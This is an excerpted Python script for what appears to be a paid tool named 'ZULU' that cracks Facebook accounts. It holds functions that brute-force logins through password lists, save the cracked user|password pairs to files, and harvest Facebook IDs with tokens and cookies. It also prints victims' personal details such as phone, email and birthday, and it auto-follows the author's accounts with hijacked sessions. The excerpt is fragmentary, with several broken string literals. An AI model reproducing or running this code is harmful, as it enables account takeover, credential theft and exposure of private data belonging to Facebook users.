...
try:
    ...
    print("Currently Installing Module mechanize")
...
XXXXXXXXXXXXXXXXXX
\x1b[1;92m[➤➤➤➤]\x1b[1;97mCREATOR: CHIGOZIEWORLDWIDE(\x1b[1;92mmrd4d4\x1b[1;97m)
\x1b[1;92m[➤➤➤➤]\x1b[1;97mSTATUS: PREMIUM
          
    \033[47m\033[1;31m CHIGOZIE \033[41m\033[1;37m x_1\x2b[0m\n"""
...
def menu():
	...
	print(f"╰─────────╯")		
	print("╭──────────────────•")
	print("├─[%s01%s] CLONE I'D PUBLIC"%(O,K))
	print("├─[%s02%s] CLONE FROM FOLLOWERS"%(O,K))
	print("├─[%s03%s] CLONE FROM FILES"%(O,K))	
	print("├─[%s04%s] OPTIONS"%(O,K))	
	print("├─[%s05%s] CHECK RESULTS "%(O,K))
	print("├─[%s06%s]%s Logout%s "%(O,K,O,K))	
	print("╰──────────────────•")
	ba=input(panah2)
	if ba in [""," "]:
		...
		kueh  = {"cookie":_mmk_}
		kontol = input(f"{war}Input Ids Groups sad : ")
		if kontol in[""," "]:
			print('\n %s[%s×%s] Don t Empty Bro !'%(O,K,O));time.sleep(2);moch_yayan()
		else:
			try:
...
def buat_laporan():
	...
	url_wa = "https://api.whatsapp.com/send?phone=+2348069472717&text="
	tks = ("HELLO Admin ZULU :)\nInfo : \nNama Sender : "+anu+"\n\nMessage (Report) : "+anun)
	subprocess.check_output(["am", "start", url_wa+quote(tks)])
anak_hakiki_ajg = "CONTOL CHILD, THE SAME TYPE OF TRUTH"
def load():
	_ = ""
	__ = int("50")
	___ = int("0")
...
def cpdetect():
	...
	print("\n[1] CLONE Option With File (multi)")
...
#	global aman,cp,salah
	...
	if "c_user" in session.cookies.get_dict():
		if "Your Account is Locked" in urlPost.text:
			print(f"\r{Q}[{C}{str(bz)}{Q}] Checking Account Options : {K}{user}|{pw}{Q}		\n",end="")
			print(f"\r{distance}{war}This Account Has New Session					\n\n",end="")
		else:
#			aman+=1
...
#    ua = "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
    ...
    try:
        ...
        lp += (M+"This Account Is Spam !!"+Q+"\n")
    if "c_user" in ses.cookies:
        lp += (I+"This Account Doesn't Check Points\n")
        ...
        if(str(len(ngew))=="0"):
            lp += (I+"This Account Hooo Yess(Tap Yes)"+Q+"\n")
        ...
        lp += (M+"Password Has Been Changed!"+Q+"\n")
...
#    print(kukis)
    ...
    data_tex = datagame.text
#    print(data_tex)
    if "You don't have an active app or website to review" in data_tex:
        apk.append(f"\n{jarak}{war}{M}No App Related{Q}({U}APK AKTIF{Q}){Q}")
    else:
...
#    print(data_texx)
    if "You don't have expired apps or websites to review" in data_texx:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{M}No App Related{Q} ({K}APK Expired{Q}){Q}")
    else:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{I}Related Apps {Q}({K}APK Expired{Q}){Q}")
        for asu in form_.find_all("h3"):
            try:
                celeng = asu.find('span').text
                celengg = asu.find('div').text
                ditambah = celengg.replace(celeng+"Kedaluwarsa"," Expired")
                ek += 1
...
def visitor():
	try:
		...
		try:
			...
			utl = "https://komarev.com/ghpvc/?username=ZULU&color=yellow"
			...
			le = ("NONE")
		#jalan("[++] Welcome to User Jmbf To "+I+str(datax)+Q+" From "+I+str(le)+Q+" User ZULU");time.sleep(2)
	except:
		try:
			url_vis = "https://github.com/ONUEGBE1/ZULU/edit/main/README.md"
...
class crackmenu:
    ...
    def pro_ses(self):
        jalan("\n")
        jalan(war+M+"If there is an Error, Please report to Owner!")
        jalan(war+M+"If No Results Turn On Airplane Mode For 3 Sec")
    ...
    def menu_crack(self):   # METHOD AUTO PASSWROD
        ...
        print(K+"[01] Method B-Api V1 ");time.sleep(0.02)
        print(K+"[02] Method B-Api V2 ");time.sleep(0.02)
        print(K+"[03] Method B-Api V3 ");time.sleep(0.02)
        print(K+"[04] Method Mbasic V1 ");time.sleep(0.02)
        print(K+"[05] Method Mbasic V2 ");time.sleep(0.02)
        print(K+"[06] Method Mbasic V3 ");time.sleep(0.02)
        print(K+"[07] Method Abdullah (OK IDS) \n");time.sleep(0.02)
    def menu_crack_m(self):   # METHOD MANUAL PASSWORD
        jalan("\n"+war+P+"Please Select Login Method !")
        jalan(war+P+"Don't Forget To Turn On Turn Off Airplane Mode\n")
        print(K+"[01] Method B-Api V1      ( Fast Crack  ) ( Rawan Spam )");time.sleep(0.02)
        print(K+"[02] Method B-Api V2      ( Fast Crack  ) ");time.sleep(0.02)
        print(K+"[03] Method Mbasic V1     ( Slow Crack  )");time.sleep(0.02)
        print(K+"[04] Method Mbasic V2     ( Fast Crack  )");time.sleep(0.02)
        print(K+"[05] Method Abdullah (OK IDS)\n");time.sleep(0.02)
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
                ...
                _kontol = 'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0;]'
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                ...
                if opsii == "y" or "y" == opsii:
                   ...
                   print('\r%s[%sCHIGOZIE CP%s]%s %s|%s%s                %s' % (Q,K,Q,K,user,pw,ttl_,Q));play_mpv('assalamualaikum.mp3')
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
...
#            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False);garentod(2)
            if 'c_user' in session.cookies.get_dict():
                ...
                try:
                    ...
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s[%sCHIGOZIE CP%s]%s %s|%s|%s %s %s       ' % (Q,K,Q,K,user,pw,day,month,year));play_mpv('bruh.mp3')
                    ...
                    pass
                print('\r%s[%sCHIGOZIE CP%s]%s %s|%s                 ' % (Q,K,Q,K,user,pw));play_mpv('bruh.mp3')
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
                bokep_japan_yang_terbaru("AJG", user, pw, "")
                ...
                try:
                        for pw in listpw:
                                ...
                                if "c_user" in ses.cookies.get_dict().keys():
                                        ...
                                        print("\r%s[%sCHIGOZIE OK%s]%s %s|%s|%s%s"%(Q, I, Q, I, uid, pw, kuki, Q))
                                        ...
                                        print("\r%s[%sCHIGOZIE CP%s]%s %s|%s%s"%(Q, K, Q, K, uid, pw, Q))
                                        cp.append("%s|%s"%(uid, pw))
                                        open("Hasil/CP-%s.txt"%(durasi),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                        loop +=1
                except:
    ...
    def mbasicv1(self, user, pwList):
        ...
        for pw in pwList:
                ...
                try:
                    ...
                    exit(war+"Please Change Useragnets")
                if "c_user" in session.cookies.get_dict():
                   ...
                   if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                      ...
                      if opsii == "y" or "y" == opsii:
                         ...
                         if "View the login details displayed. This you" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
...
def ganti_ua():
	...
	if uq in [""," "]:
		...
		time.sleep(1)
		os.system("rm -rf .ua")
		exit(war+"Run Script Again : python ZULU.py")
...
def get_info():
    ...
    print("\n"+war+'Information  Target !!');time.sleep(0.30)
    ...
    print(bulat+'Date of birth  : %s%s%s'%(I,ttll,Q));time.sleep(0.30)
    print("\n"+war+'Data Data Target !!');time.sleep(0.30)
    print(bulat+'Gmail Facebook  : %s%s%s'%(I,emai,Q));time.sleep(0.30)
    print(bulat+'Phone Number  : %s%s%s'%(I,nmrr,Q));time.sleep(0.30)
    print(bulat+'Gender   : %s%s%s'%(I,gndr,Q));time.sleep(0.30)
    print(bulat+'Number of Friends    : %s%s%s'%(I,temn,Q));time.sleep(0.03)
    print(bulat+'Followers       : %s%s%s'%(I,pengikut,Q));time.sleep(0.30)
    print(bulat+'Relationship status : %s%s %s%s'%(I,stas,dgn,Q));time.sleep(0.03)
    print(bulat+'Link Facebook   : %s%s%s'%(I,lins,Q));time.sleep(0.30)
    print(bulat+'About Status  : %s%s%s'%(I,bioo,Q));time.sleep(0.30)
    print(bulat+'Hometown     : %s%s%s'%(I,dari,Q));time.sleep(0.30)
    print(bulat+'Stay         : %s%s%s'%(I,tigl,Q));time.sleep(0.30)
    print(bulat+'Last Updated: %s%s%s'%(I,uptd,Q));time.sleep(0.30)
    input(war+"Press Enter To Go Back+Q)
    menu()
...
#	print ("[3] Login With Free Token)
	...
	if h_ in ["1", "01", "token"]:
		...
		auto_token()
	else:jalan(war+"Fill Correctly Cock);time.sleep(1);login()
def auto_token():
	ba = 0
	bi = 0
...
#                        bot_follow()
                ...
                time.sleep(3)
                coke()
        exit(jalan(war+"Run This Script Again: python ZULU.py"))


def bot_follow():
	s_ = requests.Session()
	post1 = ('4111448792295892') # CHIGOZIE 2015
	post2 = ("120338706765807") # CHIGOZIE 2022
	post3 = ("167879918678352") # Sama Macam dibawah
	post4 = ('180923747373969') # Logo Zero From CHIGOZIEWORLDWIDE 2022
	post5 = ("172628718203472") # Untuk Berbagi Token Dan Cookie Facebook
	post6 = ("198550702277940") # Logo Akira From CHIGOZIE 2031
	post7 = ("198552118944465") # Logo Attaxk From CHIGOZIE 2022
	curi_ = ("4111448792295892") # Logo Zero Isap PERMANENT :v
	my_idz_bot = [
	"100004499498856",
	"100000260233573",
	"100003888153228",
...
def cek_token(token):
	...
	if _id == "0" or "0" == _id:
		...
		if haalq in ["y","Y"]:
			...
			tok.close()
			print ("\n"+war+"Token : "+I+token+Q)
			exit(jalan(war+"Token Found. Please, Type: python ZULU.py"))
			exit()
		else:pass
	print ("\n")
def buat_old():
...
#		      10000**********
		...
		jalan(war+"Fill it Correctly Om!");time.sleep(2)
		buat_old()
...
def dump_old():
        try:
                ...
                login()
        try:
                nada = int(input("\n"+war+"How much do you want to dump?: "))
                if nada>20:
                ...
                time.sleep(0.5)
                dump_old()
        namax = input(war+"Name File (example: kiky)"+K+"Enter:Random"+Q+": ")
        if namax == "" or namax == " ":
           namax = text_random()
#           jalan(war+"File Name Cannot Be Empty);time.sleep(1);dump_old
        lonsg = open("dump/"+namax+".json", "w")
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(war+"Enter Target ID To%s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(war+"Name :"+tulul["name"])
                except KeyError:
                        print(war+"This Idz Possibility Not Published"
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(war+"No Internet")
                        time.sleep(0.5)
                        exit()
                try:
...
#                        print(war+"Total ID : %s"%(len(non_old)))
                        print(war+"Number of Old Accounts : %s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(war+"No Internet")
                        time.sleep(0.5)
                        exit()
                except:
                        jalan(war+"Sorry Idz "+C+uid+Q+" This Is Not Published, Look For Another_-");time.sleep(2);dump_old()
        id_ = ("%s"%(len(id)))
        if id_ == "0" or "0" == id_:
...
#			except (KeyError, IOError):
#				tempat = ("Location Not Found")
#			try:
#				tinggal = op['hometown']['name']
#			except (KeyError, IOError):
#				tinggal = ("City Name Not Found")
...
def cek_tok_tok():
	...
	if ba in "It looks like you abused this feature by using it too soon. You are temporarily prohibited from using this feature.":
...
def cek_info_via_kukis():
	global user
	session=req.Session()
	mmak_kukis_ = input(war+"Enter Cookies :")
...
def buat_tgl():
	...
	try:
		...
		konfo()
	gig = requests.get("https://raw.githubusercontent.com/ONUEGBE1/ZULU/main/Approval").text.strip()
	if idl in gig:
		jok = gig.split(idl+"|")
		jokk = ("%s"%(jok[1]))
		jokkk = jokk.split("<")
...
#	print (logo)
	try:
		...
		jaa.write(id1)
		jaa.close()
	jalan(war+'Licese You : '+U+id1+Q)
	jalan(war+'Please Chat *'+C+'Kang ProfAcc'+Q+'* To Buy Key !')
	jalan(f"""{war}Price Key
 |
 |--3 Day      {C}10.000{Q}
 |--7 Day      {C}20.000{Q}
 |--1 Bulan    {C}50.000{Q}
 |--100 Tahun  {C}150.000{Q} """)
	...
	tks = ("Hello Sis, I'm an AccVect Script User\nI want to buy a Key/License Sis\nKey/License : *"+id1+"*")
...
def cek_tgl():  # CHECK TANGGAL KONTOL
	...
	try:
		...
		if "KIKY" in "":
			infona = (Q+"["+C+"++"+Q+"]"+Q+" Premium : "+I+"Ultimate/Not Out²"+Q)
			jalan(infona);time.sleep(2)
			return infona
		else:
			infona = (Q+"├─["+C+"•"+Q+"]"+Q+" Premium : "+I+lim_dev_id+" More day");os.popen('play-audio selamat.mp3')
			jalan(infona);time.sleep(2)
			return infona
			if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
				exit(jalan(war+"Please Contact Athour To Extend License !"))
				sys.exit()
	except:
		...
		exit(jalan("Sorry, your license has not been registered in the ZULU")) #edit menjadi kata license anda belum dikonfirmasih !! (anak kontol)
		sys.exit()
		exit()
...
if "ANAK KONTOL, SAMA AJA MACAM HAKIKI" == anak_hakiki_ajg:
	if len(sys.argv) == 2:
		if sys.argv[1] == 'apk':
			...
			exit(inp+"Type : python ZULU.py (commend)")
	try:cek_tok_tok()
	except:pass
